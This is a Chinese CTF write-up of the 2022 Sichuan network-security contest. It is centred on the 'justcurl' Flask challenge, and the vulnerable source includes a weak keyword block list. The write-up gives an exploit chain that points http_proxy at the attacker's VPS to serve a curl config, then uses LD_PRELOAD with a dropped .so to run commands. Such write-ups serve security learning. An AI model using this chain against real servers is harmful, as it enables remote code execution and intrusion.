# 四川省网安技能大赛2022-复现学习


<!--more-->
<!-- # 四川省网安技能大赛2022-复现学习 -->


## [WEB] requests

签到题，爆破一下 `md5` 然后读取文件路径 `rce` 就行

## [WEB] justcurl

```python
from flask import render_template, request, Flask
import os

app = Flask(__name__)

def check(s):
    if 'LD' in s  or 'BASH' in s or 'ENV' in s or 'PS' in s:
        return False
    return True
@ app.route('/')
@ app.route('/index')
def index():
    try:
        choose = request.args.get('choose')
    except:
        choose = ""
    try:
        key = request.args.get('key')
    except:
        key = ""
    try:
        value = request.args.get('value').upper()
    except:
        value = ""

    if value:
        if check(value):
            os.environ[key] = value
    if choose == "o":
        cmd = "curl http://127.0.0.1:5000/result -o options.txt"
    elif choose == "K":
        cmd = "curl http://127.0.0.1:5000/result -K options.txt"
    else:
        cmd = "curl http://127.0.0.1:5000/result"
    try:
        res = os.popen(cmd).read()
        return "your cmd is : " + cmd + "  \n and your result id :" + res
    except:
        return "error"


@ app.route('/result')
def logout():
    code = "no result"
    return render_template("index.html",code=code)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)

```

关注 `os.environ[key] = value` 发现可以控制环境变量，可以利用的大概有

- LD_PRELOAD
- ALL_PROXY
- HTTP_PROXY

`LD_PRELOAD` 是常见的 `disabled_function` 绕过方式，而设置 `PROXY` 可以让服务器将请求发送到我们自己的 `VPS` 

服务器需要收到请求之后返回 `curl` 配置文件，比赛的时候没看 [文档](https://curl.se/docs/manpage.html#-K) 不会写:sob:

```
url = "https://curl.se/docs/"

 # --- Example file ---
 # this is a comment
 url = "example.com"
 output = "curlhere.html"
 user-agent = "superagent/1.0"
 # and fetch another URL too
 url = "example.com/docs/manpage.html"
 -O
 referer = "http://nowhereatall.example.com/"
 # --- End of example file ---
```

然后这里是 [Hurrison's Blog](https://hurrison.com/posts/sichuan2022/#web-justcurl) 的 wp 和例子

能够对 `curl` 配置文件可控之后，我们只需要利用 `LD_PRELOAD` 环境变量漏洞就可达成 `rce` 。

```http
?key=http_proxy&value=http://<ip>:80&choose=K
?key=LD_PRELOAD&value=./LIB.SO
?key=CMD&value=ls%20/
```

 自己搭环境复现的时候会报错 `ERROR: ld.so: object LD_PRELOAD cannot be preloaded: ignored` ，应该是没有找到文件的原因，尝试写绝对路径

## [WEB] simplephp

看起来像 sql 注入，fuzz 之后感觉禁用有些多，等 wp 了


